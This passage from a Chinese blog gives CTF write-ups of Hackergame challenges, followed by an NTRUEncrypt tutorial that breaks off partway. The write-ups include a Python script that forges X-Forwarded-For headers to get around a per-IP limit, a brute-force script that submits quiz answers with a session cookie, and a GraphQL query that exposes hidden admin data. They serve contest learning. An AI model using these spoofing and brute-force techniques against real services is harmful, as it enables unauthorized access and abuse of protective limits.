同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。</p>\n<p>为了保障同步辐射设备的持续运转，组织牺牲了大量的能源，甚至以东北部分地区无计划限电为代价，把这份沉甸甸的录音文件送到了你的手上。而刚刚起床没多久，试图抢签到题一血还失败了的你，可以不辜负同学们对你的殷切期望吗？</p>\n<p>注：flag 花括号内只包含小写字母。</p>\n</blockquote>\n<p>题目说了速度变了，显然是变快了，直接用经典音频隐写软件 Audacity 打开， <code>Ctrl</code> + <code>A</code> 全选，效果-改变速率，然后随手一拖把改变百分比拖到 <code>70</code> 就有非常标准清晰的单词，不看题目都能盲猜是首字母，后来查电报区分字符串中读音相近的字母的方法也确实对应，但是我还是不想自己听，打开翻译软件，嗯，语音识别不错，除了两个花括号我一开始没反应过来把也当成字母了QAQ。</p>\n<h2 id=\"猫咪问答-Pro-Max\"><a href=\"#猫咪问答-Pro-Max\" class=\"headerlink\" title=\"猫咪问答 Pro Max\"></a>猫咪问答 Pro Max</h2><blockquote>\n<p>我猛然一看，就猛然看到这个猫咪问答，我直呼我直呼，上次看到这么这么的发言还是上次，这问答属于是典型的典型了，我之前还没发现，当我发现的时候我已经发现了，这问答就像一个问答，问答的内容充满了内容，我不禁感慨了一句感慨：希望下次看到这么这么的猫咪问答是下次。</p>\n</blockquote>\n<p>题目的废话文学着实是让我涨了见识，这简直简直了，我以前从未想过有如此废话的废话文学，等我看见的时候已经看见了……第一问也是最难的一问，把百度必应谷歌翻烂了也没有，后来终于在一个专门存快照的国外网站上找到了那个已经消失的俱乐部的网页存档，第三问直接在中科大 Linux 用户协会官网找到，第五问也不难搜（虽然我没想到举报信可以发到这么奇怪的…呃不知怎么形容，目录？？去），第四问我看到论文直接望而生畏，搜索 data set 无果后果断爆破，合理猜测在 <code>100</code> 以下，但发现居然不行？？？万分怀疑的我试探性地把第二问改成 <code>3</code> （或许是我对近五年的理解有问题？），也不行，改成 <code>5</code> ，行了 <del>（这协会真不要 face ）</del>，脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> r</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://202.38.93.111:10001/&#x27;</span></span><br><span class=\"line\">    payload = &#123;<span class=\"string\">&#x27;q1&#x27;</span>: <span class=\"number\">20150504</span>, <span class=\"string\">&#x27;q2&#x27;</span>: <span class=\"number\">5</span>,</span><br><span class=\"line\">               <span class=\"string\">&#x27;q3&#x27;</span>: <span class=\"string\">&#x27;Development Team of Library&#x27;</span>, <span class=\"string\">&#x27;q4&#x27;</span>: <span class=\"number\">0</span>, <span class=\"string\">&#x27;q5&#x27;</span>: <span class=\"string\">&#x27;/dev/null&#x27;</span>&#125;</span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;session=eyJ0b2tlbiI6IjQ2Ok1FWUNJUUNyY2xUYU1XcG9sUzZqZzM0Z2IyZnMyeEJBNGtMa01DYnpKV1dERGNKWUJnSWhBT3RQTzBXSnhLMnRmcytWcVRReWd5eHdKMFY2dEZ6bGlycXVNSURHbU9EaSJ9.YXYWYA.2MXfMT2si0FkY-Z9jOc7V4jenTU&#x27;</span>&#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(<span class=\"number\">100</span>)):</span><br><span class=\"line\">        payload[<span class=\"string\">&#x27;q4&#x27;</span>] = i</span><br><span class=\"line\">        _ = r.post(url=url, data=payload, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            rst = re.findall(</span><br><span class=\"line\">                <span class=\"string\">r&#x27;&lt;div class=&quot;alert alert-secondary&quot; role=&quot;alert&quot;&gt;((?:.|\\n)*?)&lt;/div&gt;&#x27;</span>, _)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">            s=re.findall(<span class=\"string\">r&#x27;(flag&#123;.*?&#125;)&#x27;</span>, _)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"built_in\">print</span> (<span class=\"string\">&#x27;\\n&#x27;</span>+s)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;q4答案是&#x27;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"卖瓜\"><a href=\"#卖瓜\" class=\"headerlink\" title=\"卖瓜\"></a>卖瓜</h2><blockquote>\n<p>有一个人前来买瓜。</p>\n<p>HQ：哥们，这瓜多少钱一斤啊？</p>\n<p>你：两块钱一斤。</p>\n<p>HQ：What’s up！这瓜皮子是金子做的还是瓜粒子是金子做的？</p>\n<p>你：你瞧瞧现在哪有瓜啊？这都是大棚的瓜，只有 6 斤一个和 9 斤一个的，你嫌贵我还嫌贵呢。</p>\n<p>（HQ 心里默默一算）</p>\n<p>HQ：给我来 20 斤的瓜。</p>\n<p>你：行！</p>\n<p>HQ：行？这瓜能称出 20 斤吗？</p>\n<p>你：我开水果摊的，还不会称重？</p>\n<p>HQ：我问你这瓜能称出 20 斤吗？</p>\n<p>你：你是故意找茬，是不是？你要不要吧！</p>\n<p>HQ：你这瓜要是刚好 20 斤吗我肯定要啊。那它要是没有怎么办啊？</p>\n<p>你：要是不是 20 斤，我自己吃了它，满意了吧？</p>\n<p>（你开始选瓜称重）</p>\n</blockquote>\n<p>在看过上一年的题目后可以直接看出是溢出，但是输入的数字过大后出现了浮点数，于是我上网搜了数据类型，随便复制了一个数（ 2 的多少次方来着？？忘了）过来输入到 9 斤那，出现了一个大负数，然后我掏出大宝贝—— Windows 计算器除以 6 ，结果去掉小数后再输入到 6 斤那，此时称上有了 -2 斤，嗯，可行，再来一次， -4 了，直接再放 4 个 6 斤，逃过一劫，得到 flag 。</p>\n<h2 id=\"FLAG-助力大红包\"><a href=\"#FLAG-助力大红包\" class=\"headerlink\" title=\"FLAG 助力大红包\"></a>FLAG 助力大红包</h2><blockquote>\n<p>“听说没？【大砍刀】平台又双叒做活动啦！参与活动就送 0.5 个 flag 呢，攒满 1 个 flag 即可免费提取！”</p>\n<p>“还有这么好的事情？我也要参加！”</p>\n<p>“快点吧！我已经拿到 flag 了呢！再不参加 flag 就要发完了呢。”</p>\n<p>“那怎么才能参加呢？”</p>\n<p>“这还不简单！点击下面的链接就行”</p>\n</blockquote>\n<p>这应该是让我学到最多东西的一题，看到题目的说明我第一反应就是通过 http 请求头伪造 IP 地址，搜到可以通过 X-Forwarded-For 实现，但中途我试图通过审查元素修改表单数据实现，结果提示前后端地址不匹配（后来才发现我没读题），于是找了个伪造 IP 地址的插件，这次是后端改了前端还是原来的，两个结合，发现可以成功砍到，手改几次后发现速度来不及，被迫找到 Python 的实现，一开始没加时间限制发现有令牌桶防着，就加了个停顿，脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://202.38.93.111:10888/invite/77632ca2-c165-46ee-a8d2-ba89094b0401&#x27;</span></span><br><span class=\"line\">ua = <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(<span class=\"number\">256</span>)):</span><br><span class=\"line\">    s = (<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;.104.67.89&#x27;</span>)</span><br><span class=\"line\">    params = &#123;<span class=\"string\">&quot;ip&quot;</span>: s,&#125;</span><br><span class=\"line\">    request = requests.post(url, data=params, headers=&#123;<span class=\"string\">&#x27;User-agent&#x27;</span>: ua, <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>:s&#125;)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.9</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(request.text)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Amnesia第一问\"><a href=\"#Amnesia第一问\" class=\"headerlink\" title=\"Amnesia第一问\"></a>Amnesia第一问</h2><blockquote>\n<p>你的程序只需要输出字符串 Hello, world!（结尾有无换行均可）并正常结束。</p>\n<p>编译指令：gcc -O file.c -m32</p>\n<p>运行指令：./a.out</p>\n<p>编译器版本：Docker 镜像 ustclug/debian:10 中 apt update &amp;&amp; apt -y upgrade &amp;&amp; apt install -y gcc=4:8.3.0-1 gcc-multilib=4:8.3.0-1 的版本</p>\n<p>轻度失忆</p>\n<p>编译后 ELF 文件的 .data 和 .rodata 段会被清零。</p>\n<p>连接题目：nc 202.38.93.111 10051 或网页终端</p>\n<p>判题脚本：下载</p>\n</blockquote>\n<p>第一问不难，发现直接 <code>printf(&quot;Hello,world!&quot;)</code> 失败后改成用 <code>printf(&quot;%c&quot;,&lt;每个字符的ASCII码&gt;)</code>，但提交后错误，仔细检查发现多了几个奇怪的不可显示字符，应该是直接从网页复制的问题，删掉后提交得到flag，比赛结束后才知道还可以 putchar 呃呃</p>\n<h2 id=\"图之上的信息\"><a href=\"#图之上的信息\" class=\"headerlink\" title=\"图之上的信息\"></a>图之上的信息</h2><blockquote>\n<p>小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。</p>\n<p>你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？</p>\n</blockquote>\n<p>第一反应是 SQL 注入，但零基础的我忙活了半天才知道 <code>/graphql</code> 是端点，查看 http 请求看到负载语句 <code>&#123;query: &quot;&#123; notes(userId: 2) &#123; id↵contents &#125;&#125;&quot;&#125;</code> 猜测 admin 的 id 是 1 ，于是疯狂查询 1 的 contents ，结果回显都是我没有权限，后来搜到了 Graphql 的 IDE ，找到了存储邮箱的地方，查询得到 flag 。</p>\n<h2 id=\"Easy-RSA\"><a href=\"#Easy-RSA\" class=\"headerlink\" title=\"Easy RSA\"></a>Easy RSA</h2><blockquote>\n<p>自从 Hackergame 2018 公然揭露了大整数可以被神童口算分解的事实，RSA 在 hackergame 中已经只能处于低分值的地位了。如果不在其名称前面加上 Easy 这个单词，似乎就会显得完全对不起其他题目。</p>\n<p>更何况，在本题的附件中，你还获得了构造 p 和 q 的方式。数理基础扎实的你应该可以轻松解决这些问题吧。</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">import</span> sympy</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_p</span>():</span><br><span class=\"line\">    x = <span class=\"number\">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class=\"line\">    y = <span class=\"number\">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class=\"line\">    value_p = sympy.nextprime((math.factorial(y)) % x)  <span class=\"comment\"># Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> value_p</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_q</span>():</span><br><span class=\"line\">    value = [getPrime(<span class=\"number\">256</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">        value.append(sympy.nextprime(value[i - <span class=\"number\">1</span>]))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;value[-1] = &quot;</span>, value[-<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"comment\"># value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class=\"line\">    n = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">        n = n * value[i]</span><br><span class=\"line\">    q = getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">    value_q = <span class=\"built_in\">pow</span>(q, e, n)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;value_q = &quot;</span>, value_q)</span><br><span class=\"line\">    <span class=\"comment\"># value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> sympy.nextprime(q)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># this destroyes the rsa cryptosystem</span></span><br><span class=\"line\">p = get_p()</span><br><span class=\"line\">q = get_q()</span><br><span class=\"line\"></span><br><span class=\"line\">m = <span class=\"built_in\">int</span>.from_bytes(<span class=\"built_in\">open</span>(<span class=\"string\">&quot;flag.txt&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>).read(), <span class=\"string\">&quot;big&quot;</span>)</span><br><span class=\"line\">c = <span class=\"built_in\">pow</span>(m, e, p * q)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;c = &quot;</span>, c)</span><br><span class=\"line\"><span class=\"comment\"># c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br></pre></td></tr></table></figure>\n\n<p>数理杀我的一题， acm 的题中有过类似的，威尔逊定理求出 $p$ ， $q$ 的话不难求，很好，现在是经典 RSA 了，什么，你问我到底怎么求的 p？<del>哦？我还等你讲给我听呢（装傻，阿巴阿巴）。</del><br>首先科普一下模逆元的概念，比如 $x\\equiv 3^{-1}\\mod 5$ ，这个并非是 $x=\\frac{1}{3}$ 的意思，而是 $x$ 满足 $3x\\equiv 1 \\mod 5$ ，这时口算得出 $x=2$ ，因为 $6\\equiv 1 \\mod5$ 嘛。<br>然后是威尔逊定理，即 $(p-1)!\\equiv-1 \\pmod p$ 是 $p$ 为素数的充要条件。<br>题目给出大数 $x$ 和比 $x$ 小一点的 $y$ ，要我们求 $y! \\mod x$ ，检验发现 $x$ 是一个素数，那么就有 $(x-1)!\\equiv-1 \\pmod x$ 。<br>继而由 $(x-1)!=y(y+1)(y+2)\\cdots(x-1)$ ，不难推知<br>$$<br>y!\\equiv -1(x-1)^{-1}(x-2)^{-1}\\cdots (y+1)^{-1} \\mod\\ x<br>$$<br>python 计算逆元有两种方法，一种是 <code>pow(a, -1, b)</code>，另一种是用 gmpy2 库，即 <code>gmpy2.invert(a,b)</code></p>\n<p>完整 exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sympy</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> invert</span><br><span class=\"line\"></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_p</span>():</span><br><span class=\"line\">    x = <span class=\"number\">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class=\"line\">    y = <span class=\"number\">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class=\"line\">    facymodx = -<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(y+<span class=\"number\">1</span>,x):</span><br><span class=\"line\">        facymodx = facymodx*invert(i,x)%x</span><br><span class=\"line\">    value_p = sympy.nextprime(facymodx)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> value_p</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_q</span>():</span><br><span class=\"line\">    value_inverse = [</span><br><span class=\"line\">        <span class=\"number\">80096058210213458444437404275177554701604739094679033012396452382975889905967</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">        value_inverse.append(sympy.prevprime(value_inverse[i-<span class=\"number\">1</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">1</span></span><br><span class=\"line\">    phi = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">        n = n * value_inverse[i]</span><br><span class=\"line\">        phi = phi * (value_inverse[i]-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    value_q = <span class=\"number\">5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class=\"line\">    d = invert(e, phi)</span><br><span class=\"line\">    q = <span class=\"built_in\">pow</span>(value_q, d, n)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sympy.nextprime(q)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">c = <span class=\"number\">110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    p = get_p()</span><br><span class=\"line\">    q = get_q()</span><br><span class=\"line\">    <span class=\"comment\"># print(len(str(q)))</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(p)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    phi = (p-<span class=\"number\">1</span>) * (q-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    d = invert(e, phi)</span><br><span class=\"line\"></span><br><span class=\"line\">    m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>"},{"title":"NTRUEncrypt","date":"2022-04-10T16:26:00.000Z","_content":"NTRUEncrypt 公钥加密系统\n<!--more-->\n## 简介\n\n这里基本摘自维基百科，少少枯燥，可以自行选择略读。\n\nNTRUEncrypt 是一个公钥加密系统，它的安全性基于这样一个问题的困难性：在一个截断多项式环（这个翻译怪怪的）中**将一个给定的多项式分解成两个系数非常小的多项式的商**。\n由于加密与解密都只涉及简单的多项式乘法，故相比于其他的加密系统， NTRUEncrypt 的**效率会更高**。\n具体来说， NTRU 的操作基于截断多项式环中的对象 ${\\displaystyle \\ R=\\mathbb {Z} [X]/(X^{N}-1)}$ 中的**卷积乘法**，并且环上的所有多项式的系数和次数都为不大于 $N-1$ 的整数。\n实际上， NTRU 是一个参数化系统，每个系统由三个整数指定 $(N,p,q)$ ，其中 $N$ 代表截断环上的所有多项式的最高次为 $N-1$ ， $p$ 和 $q$ 分别代表一个小模数和一个大模数。其中 $N$ 为素数， $q$ 大于 $p$ ，且 $p$ 与 $q$ 互质。由这三个参数生成四个多项式 $\\mathcal {L}_f,\\mathcal {L}_g,\\mathcal {L}_m \\thinspace$ 和 $\\mathcal {L}_r$ ，分别为私钥、公钥、消息和干扰数。\n********************************\n看到这里，我相信懂的人都懂的，不懂的人还不懂（bushi）\n下面从宏观和微观两方面详细解释\n\n## 公钥生成\n\n又双叒叕来到了密码学的老 CP —— Alice 和 Bob\n![Alice&Bob](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fauthorize.zhongbi.net%2Fd%2Ffile%2Ftu%2F2018%2F12%2F27%2F0wlyvynx1dv.jpg&refer=http%3A%2F%2Fauthorize.zhongbi.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1652234696&t=c5802c1784650149a8a25e0440448985)\n\n1. Bob 根据选定的 $N,p,q$ 生成最高次为 $N-1$ 的 $f$ 和 $g$ **两个多项式**，并且系数在 $\\{-1,0,1\\}$ 中选取（可以认为这俩是在模 $X^{N}-1$ 的剩余类中）。 $f$ 还要满足**模 $q$ 和 $p$ 的逆元存在**，如果不满足，那就重新生成。\n2. 分别计算 $f$ 模 $p$ 和模 $q$ 的逆元，即 $f_{p}$ 和 $f_{q}$ ，**保留 $f$ , $f_{p}$ 及 $g$ 作为私钥，公钥 $h=pf_{q} \\cdot g\\ \\pmod{q} $ 。**\n\nsagemath 代码如下\n\n```python\ndef generate_keys():\n    ''' 基于提供的参数生成一个公私钥对\n        返回 f (私钥)和 F_p (公钥)'''\n\n    # 校验\n    if validate_params():\n        while True:\n            try:\n                # 生成两个随机多项式 f 和 g ，并且非零系数小于给定的 d\n                f = generate_polynomial(d)\n                g = generate_polynomial(d)\n\n                # 假定 q 是 2 的幂，求得 f 模 q 的逆元             \n                f_q = invertmodpowerof2(f,q)\n                # 同样假定 p 是素数，求得 f 模 p 的逆元\n                f_p = invertmodprime(f,p)  \n                break\n        \n            except:\n                # 上面如果抛出异常，即逆元不存在，则重新生成\n                pass \n    \n        # 公钥 h=pf_p*g (mod q)\n        public_key = balancedmod(p * convolution(f_q,g),q)\n\n        # 保留 f 和 f_p 作为私钥\n        secret_key = f,f_p\n\n        return public_key,secret_key\n\n    else:\n        print(\"Provided params are not correct. q and p should be co-prime, q should be a power of 2 considerably larger than p and p should be prime.\")\n\n```\n\n## 加密\n\nAlice 将消息 $m$ 转化成一个系数在 $\\{-1,0,1\\}$ 之间的多项式（比如转成二进制或三进制，二进制在这里会有些浪费），再随机生成一个系数较小（但不限于 $\\{-1,0,1\\}$ 中）的多项式 $r$ 作为干扰以掩盖消息。那么加密计算如下：\n$$\n    e=r \\cdot h+m \\pmod{q}\n$$\n举个栗子：\n当取 $N=5,p=3,q=32$ 时（呃这里待更新）\n$$\n    f=-1+X+X^2\n$$\n\n```python\ndef generate_message():\n    ''' 随机生成一个系数在{-1,0,1}中的多项式'''\n\n    result = list(randrange(3) - 1 for _ in range(N))\n    return Zx(result)\ndef encrypt(message, public_key):\n    ''' 基于提供的公钥加密消息'''\n\n    # 生成一个随机多项式，并且非零系数小于给定的d，作为干扰以掩盖消息   \n    r = generate_polynomial(d)\n\n    # 加密：e = r * h + m (mod q)\n    # while performing modulo operation, balance coefficients of encrypted_message \n    # for the integers in interval [-q/2, +q/2]\n    return balancedmod(convolution(public_key,r) + message,q)\n```\n\n## 解密\n\n由于其他人不知道 $r$ ，所以无法直接 $m=e-rh$ ，但 Bob 拿到 $e$ 后，可以计算出\n$$\n\\begin{equation*}\n\\begin{split}\n    a\n    & = f \\cdot e \\pmod{q}\\\\\\\\\n    & = f \\cdot (r \\cdot h+m) \\pmod{q}\\\\\\\\\n    & = f \\cdot (r \\cdot pf_{q} \\cdot g+m) \\pmod{q}\\\\\\\\\n    & = pr \\cdot g + f \\cdot m \\pmod{q}\n\\end{split}\n\\end{equation*}\n$$\n关键部分来了，以上都是在模 $q$ 下进行，而这时忽然就变成了模 $p$\n$$\nb=a=f \\cdot m \\pmod{p} \\\\\\\\\nc=f_{p} \\cdot b =f_{p} \\cdot f \\cdot m =m \\pmod{p}\n$$\n\n```python\ndef decrypt(encrypted_message, secret_key):\n    ''' 基于提供的私钥解密密文'''\n    \n    # 拿到私钥的两个多项式  \n    f,f_p = secret_key\n    \n    # a = f * e (mod p)\n    a = balancedmod(convolution(encrypted_message,f),q)\n     \n    # c = f_p * a (mod p)\n    return balancedmod(convolution(a,f_p),p)\n```\n\n## 函数实现\n\n下面从微观上解释一下上面函数的实现：\n\n### 